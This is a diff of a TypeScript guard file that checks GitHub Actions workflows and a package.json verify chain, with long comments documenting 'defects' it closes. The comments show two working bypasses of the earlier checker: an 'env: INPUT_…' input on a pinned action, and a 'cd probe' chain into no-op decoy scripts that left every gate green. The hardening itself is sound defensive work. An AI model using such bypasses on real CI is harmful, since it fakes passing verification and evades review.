     refuseWith(at(line), jobAction, entry(job, 'with'));
+    refuseEnvOnUses(at(line), jobUses, entry(job, 'env'));
 
     // `secrets:` was the third key listed as known and read nowhere. `secrets:
     // inherit` hands every repository secret to whatever the job calls, and the
@@ -3203,6 +4032,7 @@ function modelOf(workflow: Workflow, readWorkflows: ReadonlySet<string>): Workfl
       const stepAction = uses === undefined ? undefined : refuseUses(where, item.line, uses, readWorkflows);
       if (stepAction !== undefined) actions.push(stepAction.uses);
       refuseWith(at(item.line), stepAction, entry(step, 'with'));
+      refuseEnvOnUses(at(item.line), uses, entry(step, 'env'));
       return { line: item.line, run };
     });
 
@@ -3279,7 +4109,12 @@ function normaliseUsesPath(target: string): string | undefined {
  * inputs listed. That is a genuinely different question from the one above, and
  * it is bounded by five names instead of by a pattern.
  *
- * Read by {@link refuseUses} and by {@link refuseWith}, and by nothing else.
+ * The pinned list itself is read in two places: {@link refuseUses}, which looks
+ * a target up in it, and *every pinned third-party action is one the workflows
+ * really use*, which compares it with what the workflows admitted.
+ * {@link refuseWith} does **not** read the list — it reads the `inputs` of the
+ * one row {@link refuseUses} hands it. A previous version of this sentence named
+ * `refuseWith` and not the test case, which missed in both directions.
  */
 interface ThirdPartyAction {
   /** The exact `uses:` string, ref included. */
@@ -3544,6 +4379,64 @@ function refuseWith(at: string, action: ThirdPartyAction | undefined, node: Yaml
   }
 }
 
+/**
+ * An `env:` on a step or job that has a `uses:` is refused, because it is a
+ * second spelling of the `with:` {@link refuseWith} just bounded.
+ *
+ * ### Defect twenty-one: the pin bounded one of the two keys that reach an input
+ *
+ * Defect sixteen's fix pins five actions and the `with:` keys each may carry,
+ * and the header stated that pin as **the** bound on what a workflow hands an
+ * admitted action. GitHub passes a `with:` input to an action as the environment
+ * variable `INPUT_<NAME>`, so `env:` on the same step is the same channel
+ * written the other way — and `refuseWith` read only one of the two. Measured on
+ * the tree that shipped after round three, twice:
+ *
+ *     - uses: pnpm/action-setup@v4
+ *       env:
+ *         INPUT_RUN_INSTALL: |
+ *           - args: [--frozen-lockfile]
+ *       with:
+ *         version: 10
+ *
+ * was `172 passed (172)`, exit 0, while the byte-equivalent input written as
+ * `with: run_install:` on the same step was red twice by name. One action, one
+ * input, two spellings, opposite verdicts — inside the function written to close
+ * exactly that, on the key next door.
+ *
+ * **Whether GitHub's runner really feeds `env: INPUT_X` to an action as its `x`
+ * input was not established here**, and this refusal does not depend on it. It
+ * is the rule the header states for an error that is unsafe under one answer: if
+ * the runner does consume it, admitting it hands a pinned action an input nobody
+ * decided about with this file green; if it does not, refusing costs a review.
+ * The reader has no fact either way, so it refuses rather than guessing in the
+ * direction that happens to be quiet.
+ *
+ * `env:` on a **`run:`** step is untouched and stays disclosed in the header's
+ * "cannot see" list. The two are not the same question: a `run:` step's text is
+ * compared with {@link CI_GATES} by equality, so what an `env:` can do there is
+ * change what an already-listed command means; a `uses:` step has no command
+ * text at all, and every one of the header's three `env:` sentences argued from
+ * command text, which is why none of them covered this.
+ *
+ * Read by {@link modelOf}, at both levels, and by *an env: on a uses: step is
+ * the with: pin written the other way — defect twenty-one*. Load-bearing,
+ * measured on the tree this comment ships in, twice: making this a no-op is
+ * `1 failed | 180 passed (181)`, exit 1 twice, at that case — `ci.yml` carries
+ * no `env:` on a `uses:` step, so nothing else in the file sees it.
+ */
+function refuseEnvOnUses(at: string, uses: string | undefined, node: YamlNode | undefined): void {
+  if (node === undefined || uses === undefined) return;
+  const keys = mappingOf(node)?.map(({ key }) => key) ?? [];
+  throw new Error(
+    `${at} sets "env:" on a step whose work is "${uses}". GitHub hands a "with:" ` +
+      'input to an action as the environment variable INPUT_<NAME>, so this is ' +
+      'the key THIRD_PARTY_ACTIONS pins, spelled the other way' +
+      (keys.length === 0 ? '' : `: ${keys.join(', ')}`) +
+      '. Write the input under "with:", where the pin can see it.',
+  );
+}
+
 /** Everything in `.github/workflows/`, split into what runs and what does not. */
 interface WorkflowSurface {
   /** Loadable files, relative to the directory, sorted. */
@@ -3659,9 +4552,62 @@ interface VerifyCommand {
    * Whether every green run of `pnpm verify` executes this command. False for a
    * command written on the right of a `||`, and false for everything inside a
    * script that was itself invoked there. Read by the `verify reaches the CI
-   * gate` case, which demands `gating && reached`; defect twelve.
+   * gate` case, which demands `gating && reached`, and by *a gate on the right
+   * of a || is present, gating, and not reached*; defect twelve.
    */
   readonly reached: boolean;
+  /**
+   * Whether a `cd` runs in front of this command on the path from `verify` to
+   * it — so the working directory it executes in is **not** the repository root,
+   * and this reader cannot say which `package.json` a `pnpm <name>` here binds
+   * to.
+   *
+   * ### Defect nineteen: `chainOf`'s edge was an unchecked referential claim
+   *
+   * Every row above rests on one sentence: "`pnpm typecheck` runs the body of
+   * `scripts.typecheck` in the root `package.json`". `chainOf` asserted it for
+   * every command in the chain, unconditionally, and nothing checked it — while
+   * `cd` sat on round three's own allowlist, admitted with a comment saying out
+   * loud that it "changes what the commands after it do".
+   *
+   * Measured on the tree that shipped after round three, twice: a `verify` of
+   * `cd probe && pnpm typecheck && … && cd ../src-tauri && cargo build …`,
+   * alongside a probe manifest whose eight scripts are `node -e ""`, was
+   * `172 passed (172)`, exit 0. Every command parsed, every program listed,
+   * every gate row satisfied — against bodies that had nothing to do with what
+   * runs. The runtime half was measured too, with a read-only `pnpm run` in the
+   * real worktree: `sh -c 'cd probe && pnpm typecheck'` printed
+   * `> probe@1.0.0 typecheck` and ran `node -e ""`, not the root's `tsc --build
+   * --force`. The guard even printed its own blindness in the mirror control's
+   * failure message, listing `cd probe` among "the commands verify actually
+   * runs" and then resolving the eight names after it against the root manifest
+   * anyway.
+   *
+   * So the edge is now refused rather than followed once the working directory
+   * has moved, exactly as an unknown step key is refused: `chainOf` does not
+   * expand a `pnpm <name>` that is `rebound`, and
+   * {@link unclassifiedVerifyCommands} reports it. `cd src-tauri` at the end of
+   * the shipped chain costs nothing, because the two `cargo` gates behind it are
+   * not `pnpm` edges — which is the honest reason it was affordable to draw the
+   * line here rather than remove `cd` from {@link VERIFY_INVOCATIONS}.
+   *
+   * It composes **downwards only**, because that is what a shell does: a `cd` in
+   * `verify`'s body is inherited by a script `verify` invokes after it, and a
+   * `cd` inside that script's own body is not visible to `verify` when it
+   * returns.
+   *
+   * Read by {@link chainOf} itself, by {@link unclassifiedVerifyCommands}, and
+   * directly by *a pnpm script name behind a cd binds to a manifest nobody read
+   * — defect nineteen*, which asserts the flag's value per command.
+   * Three separate mutations, each measured on the tree this comment ships in,
+   * twice, each `1 failed | 180 passed (181)` with exit 1 twice at *a pnpm
+   * script name behind a cd binds to a manifest nobody read — defect nineteen*:
+   * `chainOf` no longer setting the flag at a `cd`; `chainOf` setting it and
+   * following the edge anyway; and {@link unclassifiedVerifyCommands} no longer
+   * reporting it. The shipped chain's one `cd` has no `pnpm` behind it, so all
+   * three are invisible to every other case in this file.
+   */
+  readonly rebound: boolean;
 }
 
 /**
@@ -3684,8 +4630,8 @@ interface VerifyCommand {
  * none of it runs. Nothing in this function can see that, because seeing it
  * means knowing what `exit` is. The thing that closes it is totality, not a
  * cleverer walk: *every command "pnpm verify" runs is one this reader can
- * classify* refuses any program not in {@link VERIFY_PROGRAMS}, and `exit` is
- * not one. This comment used to claim the walk returned "every command
+ * classify* refuses any command no {@link VERIFY_INVOCATIONS} entry
+ * accepts, and `exit 0` is not one. This comment used to claim the walk returned "every command
  * **reachable** from a script, by invocation rather than by mention"; it
  * returned every command *written*, and `exit 0 && <the whole shipped chain>`
  * was 141/141 green against it.
@@ -3695,14 +4641,29 @@ interface VerifyCommand {
  * added it and something swallows its exit status" apart from "you added it
  * where it only runs if something else fails", which want different fixes.
  */
-function chainOf(script: string, scripts: Record<string, string>, seen = new Set<string>([script])): VerifyCommand[] {
+function chainOf(
+  script: string,
+  scripts: Record<string, string>,
+  seen = new Set<string>([script]),
+  reboundOnEntry = false,
+): VerifyCommand[] {
   const body = scripts[script];
   if (body === undefined) return [];
   const out: VerifyCommand[] = [];
+  // The working directory this body runs in, as far as this reader can tell it:
+  // it is the caller's once a `cd` in front of the call moved it, and it moves
+  // again at the first `cd` in this body. Defect nineteen.
+  let rebound = reboundOnEntry;
   for (const segment of shellCommands(body, `package.json scripts.${script}`)) {
     const command = parseCommand(segment.text);
-    out.push({ script, command, gating: segment.gating, reached: segment.reached });
+    out.push({ script, command, gating: segment.gating, reached: segment.reached, rebound });
+    if (command.program === 'cd') rebound = true;
     if (command.program !== 'pnpm') continue;
+    // A `pnpm <name>` behind a `cd` names a script in whatever manifest that
+    // directory holds, which is not one this reader has read. It is left in the
+    // chain, marked, and refused by `unclassifiedVerifyCommands`; following it
+    // into the root manifest's body would be the unchecked claim itself.
+    if (rebound) continue;
     const at = command.args[0] === 'run' ? 1 : 0;
     const name = command.args[at];
     if (name === undefined || name.startsWith('-') || !Object.hasOwn(scripts, name) || seen.has(name)) continue;
@@ -3712,7 +4673,7 @@ function chainOf(script: string, scripts: Record<string, string>, seen = new Set
     // one of them runs. `pnpm a || pnpm b` reaches `b`'s body conditionally, so
     // a gate inside `b` is not a gate `verify` runs.
     out.push(
-      ...chainOf(name, scripts, seen).map((entry) => ({
+      ...chainOf(name, scripts, seen, rebound).map((entry) => ({
         ...entry,
         gating: entry.gating && segment.gating,
         reached: entry.reached && segment.reached,
@@ -3725,8 +4686,12 @@ function chainOf(script: string, scripts: Record<string, string>, seen = new Set
 /**
  * What `pnpm verify` actually runs.
  *
- * Read by the `verify reaches the CI gate` case, once per row of
- * {@link CI_GATES}, and by nothing else.
+ * Read by name in three cases: the `verify reaches the CI gate` row, once per
+ * row of {@link CI_GATES}; *every command "pnpm verify" runs is one this reader
+ * can classify*, which is the totality net over it; and *follows a pnpm script
+ * invocation into the script it invokes*, which asserts that the expansion
+ * happened at all. A previous version of this sentence named only the first,
+ * and the other two were added in the same commit as the sentence.
  */
 const VERIFY_CHAIN: readonly VerifyCommand[] = (() => {
   if (PACKAGE.scripts.verify === undefined) {
